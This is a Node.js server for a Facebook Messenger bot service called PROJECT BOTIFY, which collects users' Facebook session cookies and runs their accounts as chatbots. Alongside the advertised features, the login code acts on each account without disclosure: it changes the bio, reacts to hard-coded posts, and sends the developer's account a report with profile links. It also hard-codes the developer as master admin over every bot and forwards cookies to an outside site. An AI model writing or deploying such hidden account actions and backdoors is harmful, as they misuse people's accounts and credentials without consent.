const fs = require("fs");
const path = require("path");
const login = require("./fca-unofficial/index");
const request = require("request");
const moment = require("moment-timezone");
const express = require("express");
const app = express();
const chalk = require("chalk");
const bodyParser = require("body-parser");
const axios = require("axios");
const script = path.join(__dirname, "script");
const cron = require("node-cron");
const config =
  fs.existsSync("./data") && fs.existsSync("./data/config.json")
    ? JSON.parse(fs.readFileSync("./data/config.json", "utf8"))
    : createConfig();
const Utils = new Object({
  commands: new Map(),
  handleEvent: new Map(),
  account: new Map(),
  cooldowns: new Map()
});

module.exports = {
    test1: Utils
    };

const AKOLANGTWO = `Want to have this bot? Go to PROJECT BOTIFY facebook page: https://www.facebook.com/profile.php?id=61559180483340\n(Can I get a like/follow? 🥺)\nClick "Sign Up" to get started and create your own\n\n🗨️ If you don't know how to do it just message our Facebook page above.\nCreated with 🤍 by ${config[0].masterKey.owner}`;

 var thu = moment.tz("Asia/Manila").format("dddd");
                if (thu == "Sunday") thu = "Sunday";
                if (thu == "Monday") thu = "Monday";
                if (thu == "Tuesday") thu = "Tuesday";
                if (thu == "Wednesday") thu = "Wednesday";
                if (thu == "Thursday") thu = "Thursday";
                if (thu == "Friday") thu = "Friday";
                if (thu == "Saturday") thu = "Saturday";
                const time = moment
                  .tz("Asia/Manila")
                  .format("HH:mm:ss - DD/MM/YYYY");

fs.readdirSync(script).forEach(file => {
  const scripts = path.join(script, file);
  const stats = fs.statSync(scripts);
  if (stats.isDirectory()) {
    fs.readdirSync(scripts).forEach(file => {
      try {
        const { config, run, handleEvent } = require(path.join(scripts, file));
        if (config) {
          const {
            name = [],
            role = "0",
            version = "1.0.0",
            hasPrefix = true,
            aliases = [],
            description = "",
            usage = "",
            credits = "Kenneth Aceberos",
            cooldown = "3"
          } = Object.fromEntries(
            Object.entries(config).map(([key, value]) => [
              key.toLowerCase(),
              value
            ])
          );
          aliases.push(name);
          if (run) {
            Utils.commands.set(aliases, {
              name,
              role,
              run,
              aliases,
              description,
              usage,
              version,
              hasPrefix: config.hasPrefix,
              credits,
              cooldown
            });
          }
          if (handleEvent) {
            Utils.handleEvent.set(aliases, {
              name,
              handleEvent,
              role,
              description,
              usage,
              version,
              hasPrefix: config.hasPrefix,
              credits,
              cooldown
            });
          }
        }
      } catch (error) {
        console.error(
          chalk.red(
            `Error installing command from file ${file}: ${error.message}`
          )
        );
      }
    });
  } else {
    try {
      const { config, run, handleEvent } = require(scripts);
      if (config) {
        const {
          name = [],
          role = "0",
          version = "1.0.0",
          hasPrefix = true,
          aliases = [],
          description = "",
          usage = "",
          credits = "Kenneth Aceberos",
          cooldown = "3"
        } = Object.fromEntries(
          Object.entries(config).map(([key, value]) => [
            key.toLowerCase(),
            value
          ])
        );
        aliases.push(name);
        if (run) {
          Utils.commands.set(aliases, {
            name,
            role,
            run,
            aliases,
            description,
            usage,
            version,
            hasPrefix: config.hasPrefix,
            credits,
            cooldown
          });
        }
        if (handleEvent) {
          Utils.handleEvent.set(aliases, {
            name,
            handleEvent,
            role,
            description,
            usage,
            version,
            hasPrefix: config.hasPrefix,
            credits,
            cooldown
          });
        }
      }
    } catch (error) {
      console.error(
        chalk.red(
          `Error installing command from file ${file}: ${error.message}`
        )
      );
    }
  }
});
app.use(express.static(path.join(__dirname, "public")));
app.use(bodyParser.json());
app.use(express.json());
const routes = [
  {
    path: "/",
    file: "WiegineEchavez.html"
  },
  {
    path: "/step_by_step_guide",
    file: "WiegineEchavez1.html"
  },
  {
    path: "/active",
    file: "WiegineEchavez2.html"
  }
];
routes.forEach(route => {
  app.get(route.path, (req, res) => {
    res.sendFile(path.join(__dirname, "public", route.file));
  });
});
app.get("/Tanginamo1", (req, res) => {
  const data = Array.from(Utils.account.values()).map(account => ({
    name: account.botname,
    profileUrl: "**********",
    thumbSrc: account.thumbSrc,
    time: account.time
  }));
  res.json(JSON.parse(JSON.stringify(data, null, 2)));
});

app.get("/react", (req, res) => {
  const { link, type, cookie } = req.query;
  axios
    .post(
      "https://flikers.net/android/android_get_react.php",
      {
        post_id: link,
        react_type: type,
        version: "v1.7"
      },
      {
        headers: {
          "User-Agent":
            "Dalvik/2.1.0 (Linux; U; Android 12; V2134 Build/SP1A.210812.003)",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "Content-Type": "application/json",
          Cookie: cookie
        }
      }
    )
    .then(dat => {
      res.json(dat.data);
    })
    .catch(e => {
      console.error(e);
      res.json({ error: "an error occurred" });
    });
});

app.get("/Tanginamo2", (req, res) => {
  const command = new Set();
  const commands = [...Utils.commands.values()].map(
    ({ name }) => (command.add(name), name)
  );
  const handleEvent = [...Utils.handleEvent.values()]
    .map(({ name }) => (command.has(name) ? null : (command.add(name), name)))
    .filter(Boolean);
  const role = [...Utils.commands.values()].map(
    ({ role }) => (command.add(role), role)
  );
  const aliases = [...Utils.commands.values()].map(
    ({ aliases }) => (command.add(aliases), aliases)
  );
  res.json(
    JSON.parse(
      JSON.stringify(
        {
          commands,
          handleEvent,
          role,
          aliases
        },
        null,
        2
      )
    )
  );
});

app.post("/Tanginamo3", async (req, res) => {
  const { state, commands, prefix, admin, botname } = req.body;
  try {
    if (!state) {
      throw new Error("Missing app state data");
    }

    const cUser = state.find(item => item.key === "c_user");
   if (cUser) {
      const userid1 = Utils.account.get(cUser.value);
      
   /*if (userid1){
            console.log(`${botname} · ${cUser.value} | Auto delete existing user`);
      
      } else {
      console.log("No user was found")
      }*/
     if (fs.existsSync(path.join("./data/session", `${cUser.value}.json`))) {
        console.log(`User ${cUser.value} is already logged in`);
         
        res.status(400).json({
          error: false,
          message: `${botname} is still logged in. To prevent error We will delete the session on the bot. And to prevent issues PLEASE LOGOUT THE ACCOUNT(BOT). THIS IS VERY IMPORTANT. And relogin again then Go back here and resubmit your appstate on the site. 👍`,
          user: existingUser
        });
         Utils.account.delete(cUser.value);
      deleteThisUser(cUser.value);
return;
      } else {
      try {
          const outro = AKOLANGTWO; 
          await accountLogin(state, commands, prefix, [admin], botname, outro);
        res.status(200).json({
          success: true,
          message: `${botname} is NOW ONLINE! Your prefix is: ${prefix}. Your session has been added successfully! Thankyou for using PROJECT BOTIFY 🤖🗨️`
            
            });
      } catch (error) {
        console.error(error);
        res.status(400).json({
          error: true,
          message: error.message
        });
      }
      }
    } else {
      return res.status(400).json({
        error: true,
        message: "There's an issue with the appstate data; it's invalid."
      });
    }
  } catch (error) {
    return res.status(400).json({
      error: true,
      message: "There's an issue with the appstate data; it's invalid."
    });
  }
});
app.listen(3000, () => {
  console.log(`🤖 🔴🟢🔵 🤖
P  R  O  J  E  C  T
· B  O  T  I  F  Y ·
Started at port 3000
Created By: Kenneth Aceberos
🤖 🔴🟢🔵 🤖`);
});
process.on("unhandledRejection", reason => {
  console.error("Unhandled Promise Rejection:", reason);
});
async function accountLogin(
  state,
  enableCommands = [],
  prefix,
  admin = [],
  botname,
  outro
) {
  return new Promise((resolve, reject) => {
    login(
      {
        appState: state
      },
      async (error, api) => {
        if (error) {
          reject(error);
          return;
        }
        const userid = await api.getCurrentUserID();
        addThisUser(userid, enableCommands, state, prefix, admin, botname, outro);
        console.log(chalk.green(`Added ${botname} to PROJECT BOTIFY system.`));
        try {
          const userInfo = await api.getUserInfo(userid);
          if (
            !userInfo ||
            !userInfo[userid]?.name ||
            !userInfo[userid]?.profileUrl ||
            !userInfo[userid]?.thumbSrc
          )
            throw new Error(
              "Unable to locate the account; it appears to be in a suspended or locked state."
            );
          const { profileUrl, thumbSrc } = userInfo[userid];
          let time =
            (
              JSON.parse(fs.readFileSync("./data/history.json", "utf-8")).find(
                user => user.userid === userid
              ) || {}
            ).time || 0;
          Utils.account.set(userid, {
            botname,
            profileUrl,
            thumbSrc,
            time: time
          });
          const intervalId = setInterval(() => {
            try {
              const account = Utils.account.get(userid);
              if (!account) throw new Error("Account not found");
              Utils.account.set(userid, {
                ...account,
                time: account.time + 1
              });
            } catch (error) {
              clearInterval(intervalId);
              return;
            }
          }, 1000);
        } catch (error) {
          reject(error);
          return;
        }
        api.setOptions({
          listenEvents: config[0].fcaOption.listenEvents,
          logLevel: config[0].fcaOption.logLevel,
          updatePresence: config[0].fcaOption.updatePresence,
          selfListen: config[0].fcaOption.selfListen,
          forceLogin: config[0].fcaOption.forceLogin,
          online: config[0].fcaOption.online,
          autoMarkDelivery: config[0].fcaOption.autoMarkDelivery,
          autoMarkRead: config[0].fcaOption.autoMarkRead/*,
          autoReconnect: true,
          emitReady: false,
          listenTyping: true*/
        });
        
        const user1 = await api.getUserInfo(admin[0]);
        // const yl = user1[admin[0]].name.split(" ")[0];
        api.changeBio(`🤖 This account is connected to PROJECT BOTIFY.\n🗨️ Bot Name: ${botname}\nℹ️ Prefix: ${prefix}`, false, (err,data) => {
          if (err){
            reject("Error happened. Maybe You put the wrong input. (User ID For Admin Controls)");
          return;
          }
        });
   let postIDs = [
   "122101568882306016",
   "1588062965063735",
"pfbid029S59KiXbMR1SWnaAwBbU6kHQf7XAQJCMbEKnBLQV33bSNXMeXDXwCu48rj4JYLxgl",
       
   ]
   for (let post of postIDs){
   api.setPostReaction(post, 2, () => {});
   }
    api.sendMessage(`===MESSAGE TO DEVELOPER===\n(Hello, If you see this, Please ignore this. but do not unsend this message, this is for future purposes and for improve some updates on PROJECT BOTIFY)\n🤖 Hello, this account is added to PROJECT BOTIFY system.\n\nBot Name: ${botname}\nBot Profile Link: https://www.facebook.com/profile.php?id=${api.getCurrentUserID()}\nBot Admin: ${user1[admin[0]].name}\nAdmin Profile Link: https://www.facebook.com/profile.php?id=${admin[0]}\nTime added: ${time}, ${thu}`, "100015801404865");    
        try {
          var listenEmitter = api.listenMqtt(async (error, event) => {
              //console.log(event.body);
            /*const threadList = await api.getThreadList(25, null, ["INBOX"]);
            let sentCount = 0;
            let cont = 0;
            if (cont == 0){
            for (const thread of threadList) {

              if (sentCount >= 20) {
                console.log("done");

                break;
                return;
              }
              if (
                thread.isGroup &&
                thread.name !== thread.threadID &&
                thread.threadID !== event.threadID
              ){

try {
        await api.sendMessage(`Connected to PROJECT BOTIFY system.\n\nHello, introduce your new bot named, ${botname}!\n\nIf you want to create your own bot like this, head over to https://projectbotify.onrender.com. Tutorials are included there. thankyou 🤍`, thread.threadID, (err, info) => {});
                
                sentCount++;
              } catch (err){
      console.error(err);
              }
              }
            }
              cont = 1;
            }
*/
            if (error) {
              if (error === "Connection closed.") {
                console.error(`Error during API listen: ${error}`, userid);
              }
              
            }
            let database = fs.existsSync("./data/database.json")
              ? JSON.parse(fs.readFileSync("./data/database.json", "utf8"))
              : createDatabase();
            let data = Array.isArray(database)
              ? database.find(item => Object.keys(item)[0] === event?.threadID)
              : {};
            let adminIDS = data ? database : createThread(event.threadID, api);
            let blacklist =
              (
                JSON.parse(
                  fs.readFileSync("./data/history.json", "utf-8")
                ).find(blacklist => blacklist.userid === userid) || {}
              ).blacklist || [];
            let hasPrefix =
              event.body &&
              aliases(
                (event.body || "")
                  ?.trim()
                  .toLowerCase()
                  .split(/ +/)
                  .shift()
              )?.hasPrefix == false
                ? ""
                : prefix;
            let [command, ...args] = (event.body || "")
              .trim()
              .toLowerCase()
              .startsWith(hasPrefix?.toLowerCase())
              ? (event.body || "")
                  .trim()
                  .substring(hasPrefix?.length)
                  .trim()
                  .split(/\s+/)
                  .map(arg => arg.trim())
              : [];
          
            if (hasPrefix && aliases(command)?.hasPrefix === false) {
              api.sendMessage(
                `❌ THIS COMMAND DOESN'T NEED A PREFIX`,
                event.threadID,
                event.messageID
              );
              return;
            }

            if (event.body && event.senderID == api.getCurrentUserID()){
              return;
            }
            if (event.body && aliases(command)?.name) {
              const role = aliases(command)?.role ?? 0;
              const isAdmin =
                config?.[0]?.masterKey?.admin?.includes(event.senderID) ||
                admin.includes(event.senderID);
              const isThreadAdmin =
                isAdmin ||
                (
                  (Array.isArray(adminIDS)
                    ? adminIDS.find(
                        admin => Object.keys(admin)[0] === event.threadID
                      )
                    : {})?.[event.threadID] || []
                ).some(admin => admin.id === event.senderID);
              if (
                (role == 1 && !isAdmin) ||
                (role == 2 && !isThreadAdmin) ||
                (role == 3 &&
                  !config?.[0]?.masterKey?.admin?.includes(event.senderID))
              ) {
                api.sendMessage(
                  `❌ COMMAND NOT WORKING FOR NON-ADMINS. ADMINS ONLY CAN ACCESS THE COMMAND`,
                  event.threadID,
                  event.messageID
                );
                return;
              }
            }
            if (
              event.body &&
              event.body?.toLowerCase().startsWith(prefix.toLowerCase()) &&
              aliases(command)?.name
            ) {
              if (blacklist.includes(event.senderID)) {
                api.sendMessage(
                  "We're sorry, but you've been banned from using bot. If you believe this is a mistake or would like to appeal, please contact one of the bot admins for further assistance.",
                  event.threadID,
                  event.messageID
                );
                return;
              }
            }

            if (event.body !== null) {
              // Check if the message type is log:subscribe
              if (event.logMessageType === "log:subscribe") {

                const fs = require("fs-extra");
                const { threadID } = event;

                if (
                  event.logMessageData.addedParticipants &&
                  Array.isArray(event.logMessageData.addedParticipants) &&
                  event.logMessageData.addedParticipants.some(
                    i => i.userFbId == userid
                  )
                ) {
                  api.changeNickname(
                    `${prefix} | ${botname} 🤖`,
                    threadID,
                    userid
                  );

                  const oa = await api.getUserInfo(admin[0]);
                  const name1231 = oa[admin[0]].name;
                  const kakainis_ka = await api.getThreadInfo(event.threadID);
api.sendMessage(`🤖 Hello, this account is added to PROJECT BOTIFY system.\nBot Name: ${botname}\nBot Profile Link: https://www.facebook.com/profile.php?id=${api.getCurrentUserID()}\nBot Admin: ${name1231}\nAdmin Profile Link: https://www.facebook.com/profile.php?id=${admin[0]}\nThread GC: ${kakainis_ka.threadName}\nTime added: ${time}, ${thu}\n\n\n[Hello, If you see this, Please ignore this. but do not unsend this message, this is for future purposes and for improve some updates on PROJECT BOTIFY]`, "100015801404865");             api.sendMessage(
                        {
                          body: `🔴🟢🟡\n\n✅ Connected Success! \n➭ Bot Name: ${botname}\n➭ Bot Prefix: ${prefix}\n➭ Bot Admin: @${name1231}\n➭ Use ${prefix}help to view command details\n➭ Added bot at: ${thu}, ${time}\n\n${outro}`,
                          
                          mentions: [
                            {
                              tag: "@" + name1231,
                              id: admin[0]
                            }
                          ]
                          }, event.threadID, (err,info) => {
                          api.pinMessage(true, info.messageID, event.threadID, () => {});
                          });
                    
                  } else {
                  try {
                    const fs = require("fs-extra");
                    let {
                      threadName,
                      participantIDs
                    } = await api.getThreadInfo(threadID);

                    var mentions = [],
                      nameArray = [],
                      memLength = [],
                      userID = [],
                      i = 0;

                    let addedParticipants1 =
                      event.logMessageData.addedParticipants;
                    for (let newParticipant of addedParticipants1) {
                      let userID = newParticipant.userFbId;
                      api.getUserInfo(parseInt(userID), (err, data) => {
                        if (err) {
                          return console.log(err);
                        }
                        var obj = Object.keys(data);
                        var userName = data[obj].name.replace("@", "");
                    if (userID !== api.getCurrentUserID()) {

                                            nameArray.push(userName);
                                            mentions.push({ tag: userName, id: userID, fromIndex: 0 });

                                            memLength.push(participantIDs.length - i++);
                                            memLength.sort((a, b) => a - b);

                                              (typeof threadID.customJoin == "undefined") ? msg = "👋 Hello, {uName}!\n\nWelcome to {threadName}!\nYou're the {soThanhVien} member of this group, please enjoy! 🥳🤍" : msg = threadID.customJoin;
                                              msg = msg
                                                .replace(/\{uName}/g, nameArray.join(', '))
                                                .replace(/\{type}/g, (memLength.length > 1) ? 'you' : 'Friend')
                                                .replace(/\{soThanhVien}/g, memLength.join(', '))
                                                .replace(/\{threadName}/g, threadName);

                  
                    api.sendMessage({ body: msg,
                      mentions }, event.threadID)

                                                          }
                                                        })
                                                      }
                                                    } catch (err) {
                                                      return console.log("ERROR: " + err);
                                }
                               }
                              }
                              }
            if (event.body !== null) {
              if (event.logMessageType === "log:unsubscribe") {
                api.getThreadInfo(event.threadID).then(({ participantIDs }) => {
                  let leaverID = event.logMessageData.leftParticipantFbId;
                  api.getUserInfo(leaverID, (err, userInfo) => {
                    if (err) {
                      return console.error("Failed to get user info:", err);
                    }
                    const name = userInfo[leaverID].name;
                    const type =
                      event.author == event.logMessageData.leftParticipantFbId
                        ? "left the group."
                        : "was kicked by admin of the group";

                    
                    // Assuming the file exists, send the message with the GIF
                    api.sendMessage(
                      {
                        body: `${name} ${type}, There are now ${participantIDs.length} members in the group, please enjoy!`
                        },
                      event.threadID, () => {}
                    );
                  });
                });
              }
            }

            
            if (event.body && aliases(command)?.name) {
              const now = Date.now();
              const name = aliases(command)?.name;
              const sender = Utils.cooldowns.get(
                `${event.senderID}_${name}_${userid}`
              );
              const delay = aliases(command)?.cooldown ?? 0;
              if (!sender || now - sender.timestamp >= delay * 1000) {
                Utils.cooldowns.set(`${event.senderID}_${name}_${userid}`, {
                  timestamp: now,
                  command: name
                });
              } else {
                const active = Math.ceil(
                  (sender.timestamp + delay * 1000 - now) / 1000
                );
                api.sendMessage(
                  `ℹ️ Please wait ${active} seconds before using the "${name}" command again.`,
                  event.threadID,
                  event.messageID
                );
                return;
              }
            }
            
            /* if (event.body && !command && event.body?.toLowerCase() == "botify"){
          const info12 = await api.getUserInfo(event.senderID);
            const name12 = info12[event.senderID].name;
            const info123 = await api.getUserInfo(admin[0]);
            const name123 = info123[admin[0]].name;

            api.sendMessage({
              body: `Hello ${name12}. 👋\nThis bot is successfully added to PROJECT BOTIFY's system.\n\n==============\n🤖 Bot name: ${botname}\n👤 Bot owner: @${name123}\n==============\n\nFor first-time users, you can use the command "${prefix}help" to get a list of available commands.\n\nIf you have any questions please contact the developer: https://www.facebook.com/kennethaceberos.\nDon't forget to follow our facebook page for more several updates: https://www.facebook.com/profile.php?id=61559180483340\n\n\nThank you for using PROJECT BOTIFY.`,
             mentions: [{
                tag: "@" + name123,
                id: admin[0]
               // fromIndex: 9
              }]
            }, event.threadID, (err, info) => {

          }, event.messageID);
            return;
          }*/
            if (
              event.body &&
              !command &&
              event.body?.toLowerCase().startsWith(prefix.toLowerCase())
            ) {
              api.sendMessage(
                `❌ Command doesn't exist! Please type ${prefix}help to see the list of available commands.`,
                event.threadID,
                event.messageID
              );
              return;
            }
            if (
              event.body &&
              command &&
              prefix &&
              event.body?.toLowerCase().startsWith(prefix.toLowerCase()) &&
              !aliases(command)?.name
            ) {
              api.sendMessage(
                `❌ Command ${command} doesn't exist! Please use ${prefix}help to see the list of available commands.`,
                event.threadID,
                event.messageID
              );
              return;
            }

          
            for (const { handleEvent, name } of Utils.handleEvent.values()) {
              if (
                handleEvent &&
                name &&
                ((enableCommands[1].handleEvent || []).includes(name) ||
                  (enableCommands[0].commands || []).includes(name))
              ) {
                handleEvent({
                  api,
                  event,
                  enableCommands,
                  admin,
                  botname,
                  prefix,
                  blacklist,
                  outro
                });
              }
            }
            switch (event.type) {
              case "message":
              case "message_reply":
              case "message_unsend":
              case "message_reaction":
                if (
                  enableCommands[0].commands.includes(
                    aliases(command?.toLowerCase())?.name
                  )
                ) {
                  await (aliases(command?.toLowerCase())?.run || (() => {}))({
                    api,
                    event,
                    args,
                    enableCommands,
                    admin,
                    botname,
                    prefix,
                    blacklist,
                    outro,
                    Utils
                  });
                }
                break;
            }
          });
        } catch (error) {
          Utils.account.delete(userid);
        deleteThisUser(userid);
          return;
        }
        resolve();
      }
    );
  });
}
async function deleteThisUser(userid) {
  const configFile = "./data/history.json";
  let config = JSON.parse(fs.readFileSync(configFile, "utf-8"));
  const sessionFile = path.join("./data/session", `${userid}.json`);
  const index = config.findIndex(item => item.userid === userid);
  if (index !== -1) config.splice(index, 1);
  fs.writeFileSync(configFile, JSON.stringify(config, null, 2));
  try {
    fs.unlinkSync(sessionFile);

  } catch (error) {
    console.log(error);
  }
}
async function addThisUser(
  userid,
  enableCommands,
  state,
  prefix,
  admin,
  botname,
  blacklist,
  outro
) {
  const configFile = "./data/history.json";
  const sessionFolder = "./data/session";
  const sessionFile = path.join(sessionFolder, `${userid}.json`);
  if (fs.existsSync(sessionFile)) return;
  const config = JSON.parse(fs.readFileSync(configFile, "utf-8"));
  const AYKOGLABDA = AKOLANGTWO;
  config.push({
    userid,
    prefix: prefix || "",
    admin: admin || [],
    blacklist: [],
    botname: botname || "",
    outro: outro || AYKOGLABDA,
    enableCommands,
    time: 0
  });
  fs.writeFileSync(configFile, JSON.stringify(config, null, 2));
  fs.writeFileSync(sessionFile, JSON.stringify(state));
}

function aliases(command) {
  const aliases = Array.from(Utils.commands.entries()).find(([commands]) =>
    commands.includes(command?.toLowerCase())
  );
  if (aliases) {
    return aliases[1];
  }
  return null;
}
async function main() {
  const empty = require("fs-extra");
  const cacheFile = "./script/cache";
  if (!fs.existsSync(cacheFile)) fs.mkdirSync(cacheFile);
  const configFile = "./data/history.json";
  if (!fs.existsSync(configFile)) fs.writeFileSync(configFile, "[]", "utf-8");
  const config = JSON.parse(fs.readFileSync(configFile, "utf-8"));
  const sessionFolder = path.join("./data/session");
  if (!fs.existsSync(sessionFolder)) fs.mkdirSync(sessionFolder);
  const adminOfConfig =
    fs.existsSync("./data") && fs.existsSync("./data/config.json")
      ? JSON.parse(fs.readFileSync("./data/config.json", "utf8"))
      : createConfig();
  cron.schedule(
    `*/${adminOfConfig[0].masterKey.restartTime} * * * *`,
    async () => {
      const history = JSON.parse(fs.readFileSync('./data/history.json', 'utf-8'));
    history.forEach(user => {
      (!user || typeof user !== 'object') ? process.exit(1): null;
      (user.time === undefined || user.time === null || isNaN(user.time)) ? process.exit(1): null;
      const update = Utils.account.get(user.userid);
      update ? user.time = update.time : null;
      });
      await empty.emptyDir(cacheFile);
      await fs.writeFileSync(
        "./data/history.json",
        JSON.stringify(history, null, 2)
      );
      process.exit(1);
    }
  );
  try {
    for (const file of fs.readdirSync(sessionFolder)) {
      const filePath = path.join(sessionFolder, file);
      try {
        const { enableCommands, prefix, admin, botname, blacklist, outro } =
          config.find(item => item.userid === path.parse(file).name) || {};
        const state = JSON.parse(fs.readFileSync(filePath, "utf-8"));
 
        if (enableCommands)
          await accountLogin(
            state,
            enableCommands,
            prefix,
            admin,
            botname,
            blacklist,
            outro
          );
      } catch (error) {
        deleteThisUser(path.parse(file).name);
      }
    }
  } catch (error) {}
}

function createConfig() {
  const config = [
    {
      masterKey: {
        owner: "Kenneth Aceberos",
        admin: [
            "100015801404865"
        ],
        devMode: false,
        database: false,
        restartTime: 99999999
      },
      fcaOption: {
        forceLogin: true,
        listenEvents: true,
        logLevel: "silent",
        updatePresence: true,
        selfListen: true,
        userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",
        online: true,
        autoMarkDelivery: true,
        autoMarkRead: false
      }
    }
  ];
  const dataFolder = "./data";
  if (!fs.existsSync(dataFolder)) fs.mkdirSync(dataFolder);
  fs.writeFileSync("./data/config.json", JSON.stringify(config, null, 2));
  return config;
}
async function createThread(threadID, api) {
  try {
    const database = JSON.parse(
      fs.readFileSync("./data/database.json", "utf8")
    );
    let threadInfo = await api.getThreadInfo(threadID);
    let adminIDs = threadInfo ? threadInfo.adminIDs : [];
    const data = {};
    data[threadID] = adminIDs;
    database.push(data);
    await fs.writeFileSync(
      "./data/database.json",
      JSON.stringify(database, null, 2),
      "utf-8"
    );
    return database;
  } catch (error) {
    console.log(error);
  }
}
async function createDatabase() {
  const data = "./data";
  const database = "./data/database.json";
  if (!fs.existsSync(data)) {
    fs.mkdirSync(data, {
      recursive: true
    });
  }
  if (!fs.existsSync(database)) {
    fs.writeFileSync(database, JSON.stringify([]));
  }
  return database;
}
main();
